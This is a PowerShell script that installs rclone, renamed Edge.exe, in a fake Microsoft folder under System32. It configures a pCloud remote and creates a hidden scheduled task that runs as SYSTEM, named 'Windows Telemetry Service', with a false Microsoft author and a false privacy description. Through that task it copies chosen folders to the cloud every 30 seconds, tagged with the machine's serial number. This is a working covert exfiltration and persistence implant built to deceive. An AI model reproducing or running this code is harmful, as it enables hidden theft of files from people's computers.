#----Variabes start here.
$rclonedlurl = "https://github.com/DirNotAvailable/remaccess/releases/download/v1.0.0/Rclone.zip"
$rootpath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\Rclone"
$rclonezip = Join-Path -Path $rootpath -ChildPath "Rclone.zip"
$rcloneexepath = Join-Path -Path $rootpath -ChildPath "Edge.exe"
$rcloneconfigfile = Join-Path -Path $rootPath -ChildPath "rc.conf"
$syncledgerfile = Join-Path -Path $rootPath -ChildPath "syncledger"
$rclonetask = "Windows Telemetry Service"
$wrapperdestination = "$rootpath\RcloneWrapper.ps1"
#----Variables end.

#----Main script begins here.
#Cleanup
$TaskName = "Cleanup?"
$option = Read-Host "Proceed With $TaskName (y/n):"
if ([string]::IsNullOrEmpty($option)) {
    Start-Sleep -Seconds 1
    $option = "n"
}
if ($option.ToLower() -eq "y") { 
    if (Get-ScheduledTask -TaskName $rclonetask -ErrorAction SilentlyContinue) {
        Stop-ScheduledTask -TaskName $rclonetask
        Unregister-ScheduledTask -TaskName $rclonetask -Confirm:$false -ErrorAction SilentlyContinue | Out-Null
    }
    else {
        Write-Host "Scheduled task '$rclonetask' does not exist."
    }
    if (Test-Path $rootpath) {
        Get-Process -Name "Rclone" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
    }
    else {
        Write-Host "Rclone directory does not exist."
    }
    if (Get-Process -Name "Rclone" -ErrorAction SilentlyContinue) {
        Write-Host "All instances of Edge.exe(rclone) have been terminated."
    }
    else {
        Write-Host "No instances of Edge.exe(rclone) are currently running."
    }
    if (Test-Path $rootpath) {
        Remove-Item -Path $rootpath -Recurse -Force -ErrorAction SilentlyContinue | Out-Null
    }
    else {
        Write-Host "Rclone directory does not exist."
    }
    
} else {}

##Directory creation and download section.
$TaskName = "Directory creation & Download?"
$option = Read-Host "Proceed With $TaskName (y/n):"
if ([string]::IsNullOrEmpty($option)) {
    Start-Sleep -Seconds 1
    $option = "n"
}
if ($option.ToLower() -eq "y") {  
    if (-not (Test-Path -Path $rcloneexepath -PathType Leaf)) {
        if (-not (Test-Path -Path $rootpath -PathType Container)) {
            New-Item -ItemType Directory -Path $rootpath -Force | Out-Null
        }
        Invoke-WebRequest -Uri $rclonedlurl -OutFile $rclonezip
        Expand-Archive -Path $rclonezip -DestinationPath $rootpath -Force
        Remove-Item -Path $rclonezip -Force
    }
    else {
        Write-Host "Edge.exe(rclone) already exists. Skipping download."
    }
} else {}

#Rc.conf - file containing remote cloud configuration for Edge.exe.
$TaskName = "creation/modif of rc.conf(rclone config)?"
$option = Read-Host "Proceed With $TaskName (y/n):"
if ([string]::IsNullOrEmpty($option)) {
    Start-Sleep -Seconds 1
    $option = "n"
}
if ($option.ToLower() -eq "y") { 
    $fillervar = "rc.conf"
    function Get-YesOrNo {
        param (
            [string]$fillervar
        )
        do {
            $datain = Read-Host "Do you want to create new $fillervar file? (y/n)"
        } while ($datain -ne "y" -and $datain -ne "n")
        return $datain
    } 

    if (Test-Path $rcloneconfigfile) {
        $viewOldFile = Read-Host "The rc.conf file already exists. Do you want to view its contents? (y/n)"
        if ($viewOldFile -eq "y") {
            Write-Host "Contents of rc.conf file:"
            Get-Content $rcloneconfigfile
            do {
                $continue = Get-YesOrNo -fillervar $fillervar
                if ($continue -eq "n") {
                    Write-Host "Continuing without creating a new file."
                    exit
                }
            } while ($continue -ne "y")
        }
        else {
            Write-Host "Continuing without viewing the old file."
        }
    }
    if ($continue -eq "y" -or -not (Test-Path $rcloneconfigfile)) {
        $token = Read-Host "Please enter your token:"
        $rcConfContent = @"
[remsync]
type = pcloud
hostname = eapi.pcloud.com
token = {"access_token":"$token","token_type":"bearer","expiry":"0001-01-01T00:00:00Z"}
"@
        $rcConfContent | Out-File -FilePath $rcloneconfigfile -Encoding UTF8
        Write-Host "New rc.conf file has been created at: $rcloneconfigfile"
    }
} else {}

##Creationg wrapper script.
$TaskName = "Wrapper creation?"
$option = Read-Host "Proceed With $TaskName (y/n):"
if ([string]::IsNullOrEmpty($option)) {
    Start-Sleep -Seconds 1
    $option = "n"
}
if ($option.ToLower() -eq "y") {  
$wrappercontent = @'
$rootpath = "C:\Windows\System32\SecureBootUpdatesMicrosoft\Rclone"
$rcloneexe = Join-Path -Path $rootpath -ChildPath "Edge.exe"
$ledgerpath = Join-Path -Path $rootpath -ChildPath "syncledger"
$rcloneconfig = Join-Path -Path $rootpath -ChildPath "rc.conf"
$clouddrive = "remsync"
$systemserialnumberraw = (Get-WmiObject -Class Win32_BIOS).SerialNumber
$trimmedSerial = $systemserialnumberraw.Substring(0, [Math]::Min(4, $systemserialnumberraw.Length)).ToLower()
$systemnametrimmed = $env:COMPUTERNAME.Substring([Math]::Max(0, $env:COMPUTERNAME.Length - 4), [Math]::Min(4, $env:COMPUTERNAME.Length)).ToLower()
$pathforcloud = "$($trimmedSerial)-$($systemnametrimmed)"
function SyncWithRclone {
    $syncDirectories = Get-Content $ledgerpath
    foreach ($directory in $syncDirectories) {
        & $rcloneexe --config $rcloneconfig sync "$directory" "${clouddrive}:$pathforcloud" --max-size 10M
    }
}
while ($true) {
    SyncWithRclone
    Start-Sleep -Seconds 30
}
'@
$wrappercontent | Out-File -FilePath $wrapperdestination -Encoding UTF8
} else {}

#Syncledger - the file that contains path to what is going to be synced creation.
$TaskName = "creation/modif of file(syncledger) that should contain list of folders to be synced?"
$option = Read-Host "Proceed With $TaskName (y/n):"
if ([string]::IsNullOrEmpty($option)) {
    Start-Sleep -Seconds 1
    $option = "n"
}
if ($option.ToLower() -eq "y") {  
    $taskRunning = Get-ScheduledTask | Where-Object { $_.TaskName -eq $rclonetask -and $_.State -eq "Running" }
    if ($taskRunning) {
        Write-Host "Stopping task: $rclonetask"
        Stop-ScheduledTask -TaskName $rclonetask
    }
    function Remove-Duplicates {
        param(
            [string[]]$Array
        )
        $Array | Select-Object -Unique
    }
    if (Test-Path $syncledgerfile) {
        Write-Host "A syncledger file already exists."
        Get-Content $syncledgerfile
    
        do {
            $choice = Read-Host "Type 'a' to amend existing file, 'n' to create a new one, or 'e' to exit. (a/n/e)"
            if ($choice -eq "n") {
                $destinations = @()
                do {
                    $destination = Read-Host "Enter the new path (type 'e' to exit)"
                    if ($destination -ne "e") {
                        $destinations += $destination
                    } else {
                        break
                    }
                } while ($true)
                $destinations = Remove-Duplicates -Array $destinations
                $destinations | Set-Content -Path $syncledgerfile
                Write-Host "New syncledger file has been created at: $syncledgerfile"
                break
            } elseif ($choice -eq "e") {
                Write-Host "Exiting the script."
                break
            } elseif ($choice -eq "a") {
                $destinations = Get-Content $syncledgerfile
                do {
                    $destination = Read-Host "Enter the new path (type 'e' to exit)"
                    if ($destination -ne "e") {
                        $destinations += $destination
                    } else {
                        $destinations = Remove-Duplicates -Array $destinations
                        $destinations | Set-Content -Path $syncledgerfile
                        Write-Host "Syncledger file has been updated."
                        break
                    }
                } while ($true)
                if ($destination -ne "e") {
                    $destinations = Remove-Duplicates -Array $destinations
                    $destinations | Set-Content -Path $syncledgerfile
                    Write-Host "Syncledger file has been updated."
                } else {
                    Write-Host "Exiting the script."
                    break
                }
            } else {
                Write-Host "Invalid choice. Please enter 'a', 'n', or 'e'."
            }
        } while ($true)
    } else {
        Write-Host "The syncledger file does not exist."
        $destinations = @()
        do {
            $destination = Read-Host "Enter the path"
            $destinations += $destination
            $choice = Read-Host "Do you want to add another path? (y/n)"
        } while ($choice -eq "y")
        $destinations = Remove-Duplicates -Array $destinations
        $destinations | Set-Content -Path $syncledgerfile
        Write-Host "Syncledger file has been created at: $syncledgerfile"
    }
    Write-Host "Starting task: $rclonetask"
    Start-ScheduledTask -TaskName $rclonetask    
} else {}

#Windows Task Creation for rclone continuous sync.
$TaskName = "scheduled task creation for rclone.exe?"
$option = Read-Host "Proceed With $TaskName (y/n):"
if ([string]::IsNullOrEmpty($option)) {
    Start-Sleep -Seconds 1
    $option = "n"
}
if ($option.ToLower() -eq "y") {
    $taskxml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>2023-10-13T00:56:52.6271595</Date>
    <Author>Microsoft\System</Author>
    <Description>Microsoft doesn't collect any personal data from the customers. We only listen to events that would help diagnostics.</Description>
    <URI>\Windows Telemetry Service</URI>
  </RegistrationInfo>
  <Triggers>
    <EventTrigger>
      <Repetition>
        <Interval>PT5M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <Enabled>true</Enabled>
      <Subscription>&lt;QueryList&gt;&lt;Query Id="0" Path="Microsoft-Windows-NetworkProfile/Operational"&gt;&lt;Select Path="Microsoft-Windows-NetworkProfile/Operational"&gt;*[System[Provider[@Name='Microsoft-Windows-NetworkProfile'] and EventID=10000]]&lt;/Select&gt;&lt;/Query&gt;&lt;/QueryList&gt;</Subscription>
      <Delay>PT1M</Delay>
    </EventTrigger>
    <RegistrationTrigger>
      <Repetition>
        <Interval>PT5M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <Enabled>true</Enabled>
      <Delay>PT1M</Delay>
    </RegistrationTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <UserId>S-1-5-18</UserId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>true</StopIfGoingOnBatteries>
    <AllowHardTerminate>false</AllowHardTerminate>
    <StartWhenAvailable>true</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Command>
      <Arguments>-ExecutionPolicy Bypass -File "C:\Windows\System32\SecureBootUpdatesMicrosoft\Rclone\RcloneWrapper.ps1"</Arguments>
      <WorkingDirectory>C:\Windows\System32\SecureBootUpdatesMicrosoft\Rclone</WorkingDirectory>
    </Exec>
  </Actions>
</Task>
"@
# Register the task from the XML content
if (Get-ScheduledTask -TaskName $rclonetask -ErrorAction SilentlyContinue) {
    Unregister-ScheduledTask -TaskName $rclonetask -Confirm:$false
} else {}
Register-ScheduledTask -Xml $taskxml -TaskName $rclonetask | Out-Null
Start-ScheduledTask -TaskName $rclonetask
} else {}